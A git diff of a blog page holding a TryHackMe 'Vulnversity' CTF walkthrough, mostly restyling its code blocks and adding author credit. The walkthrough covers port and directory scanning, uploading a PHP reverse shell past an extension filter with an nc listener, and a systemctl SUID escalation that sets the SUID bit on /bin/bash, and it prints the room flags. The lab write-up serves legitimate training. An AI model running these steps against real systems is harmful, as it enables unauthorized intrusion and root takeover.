@@ -41,7 +41,7 @@
 <meta itemprop="name" content="THM_Vulnversity_Walkthrough">
 <meta itemprop="description" content="Simple Walkthrough for a TryHackMe Room"><meta itemprop="datePublished" content="2023-04-11T15:50:37-05:00" />
 <meta itemprop="dateModified" content="2023-04-11T15:50:37-05:00" />
-<meta itemprop="wordCount" content="812"><meta itemprop="image" content="https://jb-williams.github.io/jbtech.github.io/"/>
+<meta itemprop="wordCount" content="823"><meta itemprop="image" content="https://jb-williams.github.io/jbtech.github.io/"/>
 <meta itemprop="keywords" content="linux,pentest,escalation,SUID,scanning,burb,gobuster,feroxbuster," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://jb-williams.github.io/jbtech.github.io/"/>
@@ -153,6 +153,8 @@
 
       <div class="post-content">
         <h1 id="vulnversity-walkthrough-tryhackme">Vulnversity Walkthrough TryHackMe</h1>
+<h4 id="performed-by-jb-williams">performed by: jb-williams</h4>
+<h1 id="heading"></h1>
 <h2 id="reconnaisance">Reconnaisance</h2>
 <p>They first ask for you to search for any <code>nmap</code> resourses(cheatsheets) online, I came across this one that seemed really useful:
 <code>https://www.stationx.net/nmap-cheat-sheet/</code></p>
@@ -162,39 +164,39 @@
 <ul>
 <li>While doing my scans I like to create a file that contains just the numerical port values to have. So my command came out like this:</li>
 </ul>
-<pre tabindex="0"><code>nmap -v -T4 -sV -sC -oA nmap/initial 10.10.124.14 &amp;&amp; grep -i &#34;open&#34; nmap/initial.nmap | cut -d&#39; &#39; -f 1 | cut -d&#39;/&#39; -f1 | tee nmap/ports.txt | wc -l
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -v -T4 -sV -sC -oA nmap/initial 10.10.124.14 <span style="color:#f92672">&amp;&amp;</span> grep -i <span style="color:#e6db74">&#34;open&#34;</span> nmap/initial.nmap | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f <span style="color:#ae81ff">1</span> | cut -d<span style="color:#e6db74">&#39;/&#39;</span> -f1 | tee nmap/ports.txt | wc -l
+</span></span></code></pre></div><ul>
 <li>Number of ports open: <code>6</code></li>
 </ul>
-<h1 id="heading"></h1>
+<h1 id="heading-1"></h1>
 <h3 id="what-version-of-the-squid-proxy-is-running-on-the-machine"><strong>What version of the <code>squid proxy</code> is running on the machine?</strong></h3>
-<pre tabindex="0"><code>grep -i &#34;squid&#34; nmap/initial.nmap | awk &#39;{print $NF}&#39;
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;squid&#34;</span> nmap/initial.nmap | awk <span style="color:#e6db74">&#39;{print $NF}&#39;</span>
+</span></span></code></pre></div><ul>
 <li>Version of Squid Proxy: <code>3.5.12</code></li>
 </ul>
-<h1 id="heading-1"></h1>
+<h1 id="heading-2"></h1>
 <h3 id="how-many-ports-will-nmap-scan-if-the-flag--p-400-is-used"><strong>How many ports will nmap scan if the flag -p-400 is used?</strong></h3>
 <ul>
 <li>Looking at man page or online resource: <code>400</code></li>
 </ul>
-<h1 id="heading-2"></h1>
+<h1 id="heading-3"></h1>
 <h3 id="using-the-nmap-flag--n-what-will-it-not-resolve"><strong>Using the nmap flag -n what will it not resolve?</strong></h3>
 <ul>
 <li>Looking at man page or online resource: <code>DNS</code></li>
 </ul>
-<h1 id="heading-3"></h1>
+<h1 id="heading-4"></h1>
 <h3 id="what-is-the-most-likely-operating-system-this-machine-is-running"><strong>What is the most likely operating system this machine is running?</strong></h3>
-<pre tabindex="0"><code>grep -i &#34;os&#34; nmap/initial.nmap
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;os&#34;</span> nmap/initial.nmap
+</span></span></code></pre></div><ul>
 <li>Quickly scanning output, you can see that: <code>Ubuntu</code> is listed most.</li>
 </ul>
 <h3 id="what-port-is-the-web-server-running-on"><strong>What port is the web server running on?</strong></h3>
-<pre tabindex="0"><code>grep -i &#34;http&#34; nmap/initial.nmap
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>grep -i <span style="color:#e6db74">&#34;http&#34;</span> nmap/initial.nmap
+</span></span></code></pre></div><ul>
 <li>Http server is on port: <code>3333</code></li>
 </ul>
 <p><em>Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don&rsquo;t forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)</em></p>
-<h1 id="heading-4"></h1>
+<h1 id="heading-5"></h1>
 <h2 id="locating-directories-using-gobuster">Locating directories using GoBuster</h2>
 <p>Using <code>gobuster</code>:</p>
 <table>
@@ -232,20 +234,20 @@
 </tbody>
 </table>
 <h3 id="what-is-the-directory-that-has-an-upload-form-page"><strong>What is the directory that has an upload form page?</strong></h3>
-<pre tabindex="0"><code>gobuster dir -u http://10.10.124.148:3333 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt -t 15
-</code></pre><p><em>I like using <code>feroxbuster</code> and it let me know more info esp. about the dir path sooner</em></p>
-<pre tabindex="0"><code>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t 15 -L 15 -s 200,302,304 -e -u http://10.10.124.148:3333/
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster dir -u http://10.10.124.148:3333 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt -t <span style="color:#ae81ff">15</span>
+</span></span></code></pre></div><p><em>I like using <code>feroxbuster</code> and it let me know more info esp. about the dir path sooner</em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>feroxbuster -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o ferox-initial.txt -t <span style="color:#ae81ff">15</span> -L <span style="color:#ae81ff">15</span> -s 200,302,304 -e -u http://10.10.124.148:3333/
+</span></span></code></pre></div><ul>
 <li>The directory that has an upload form page is: <code>/internal/</code> and <code>/internal/uploads</code>(but they don&rsquo;t ask for this one, its just important to know about later)</li>
 </ul>
-<h1 id="heading-5"></h1>
+<h1 id="heading-6"></h1>
 <h2 id="compromise-the-webserver">Compromise the webserver</h2>
 <p>After finding the form to upload files:</p>
 <h3 id="what-file-type-which-youd-wnat-to-upload-to-exploit-the-server-is-blocked-try-a-couple-to-find-out"><em>What file type, which you&rsquo;d wnat to upload to exploit the server, is blocked? Try a couple to find out.</em>*</h3>
 <ul>
 <li>Fist, trying to upload a reverse shell: this was blocked <code>reverseshell.php</code></li>
 </ul>
-<h1 id="heading-6"></h1>
+<h1 id="heading-7"></h1>
 <ul>
 <li>
 <p>The room walks you through using <code>burp</code> to fuzz the upload for, I wrote a python script to fuzz for me.:</p>
@@ -263,14 +265,14 @@
 <p>Download this PHP revsere shell <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">downloadLink</a> - <code>php-reverse-shell.phtml</code></p>
 </li>
 </ul>
-<h1 id="heading-7"></h1>
+<h1 id="heading-8"></h1>
 <ul>
 <li>Edit the file changing the IP to your <code>tun0</code> THM IP and desired port.</li>
 <li>Setup a listener on the port specified in the reverse shell
 ex:</li>
 </ul>
-<pre tabindex="0"><code>nc -lnvp 4444
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><ul>
 <li>Upload the reverse shell on the upload form and navigate here to execute the payload <code>http://&lt;IP&gt;:3333/internal/uploads/php-reverse-shell.phtml</code></li>
 </ul>
 <h3 id="what-is-the-name-of-the-user-who-managers-the-webserver"><em>What is the name of the user who managers the webserver?</em>*</h3>
@@ -288,37 +290,37 @@ ex:</li>
 <p>Ls <code>/home/bill</code> and see <code>user.txt</code></p>
 </li>
 </ul>
-<pre tabindex="0"><code>cat /home/bill/user.txt
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /home/bill/user.txt
+</span></span></code></pre></div><ul>
 <li>The contents of <code>user.txt</code>: <code>8bd7992fbe8a6ad22a63361004cfcedb</code></li>
 </ul>
 <h2 id="privilage-escalation">Privilage Escalation</h2>
-<p>Per THM:
-*In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</p>
-<p>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.*</p>
+<p>Per THM -<br>
+<em>In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).</em></p>
+<p><em>For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.</em></p>
 <h3 id="on-the-system-search-for-all-suid-files-what-file-stands-out"><strong>On the system search for all SUID files. What file stands out?</strong></h3>
 <ul>
 <li>I tend to use this <code>find</code> command to search for SUID&rsquo;s</li>
 </ul>
-<pre tabindex="0"><code>find / -perm -4000 2&gt;/dev/null
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><ul>
 <li>Sort of using my own system as a reference, I saw this one looking fairly unusual: <code>/bin/systemctl</code></li>
 </ul>
-<h1 id="heading-8"></h1>
+<h1 id="heading-9"></h1>
 <h3 id="become-root-and-get-the-last-flag-rootroottxt"><strong>Become root and get the last flag (/root/root.txt)</strong></h3>
 <ul>
 <li>Navigating to <a href="https://gtfobins.github.io/gtfobins/">GTFOBins</a> and search for that bin file.</li>
 <li>I took the <code>Sudo (b)</code> one and modified it</li>
 </ul>
-<pre tabindex="0"><code>TF=$(mktemp).service
-echo &#39;[Service]
-Type=oneshot
-ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
-[Install]
-WantedBy=multi-user.target&#39; &gt; $TF
-/bin/systemctl link $TF
-/bin/systemctl enable --now $TF
-</code></pre><h1 id="heading-9"></h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp<span style="color:#66d9ef">)</span>.service
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;[Service]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Type=oneshot
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[Install]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">WantedBy=multi-user.target&#39;</span> &gt; $TF
+</span></span><span style="display:flex;"><span>/bin/systemctl link $TF
+</span></span><span style="display:flex;"><span>/bin/systemctl enable --now $TF
+</span></span></code></pre></div><h1 id="heading-10"></h1>
 <ul>
 <li>I literally copy/pasted that chunk into my terminal and ran it.</li>
 <li>Then I ran <code>bash -p</code> to escalate to <code>root</code></li>
@@ -326,6 +328,9 @@ WantedBy=multi-user.target&#39; &gt; $TF
 <li>Cat out root.txt <code>cat /root/root.txt</code></li>
 <li>The contents of root.txt: <code>a58ff8579f0a9270368d33a9966c7fd5</code></li>
 </ul>
+<h1 id="heading-11"></h1>
+<h1 id="heading-12"></h1>
+<p><em>written and performed by jb-williams</em> - <a href="https://github.com/jb-williams/">github</a></p>
 
       </div>
     </article>
@@ -358,7 +363,7 @@ WantedBy=multi-user.target&#39; &gt; $TF
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        812 Words
+        823 Words
       </p>
 
       <p>
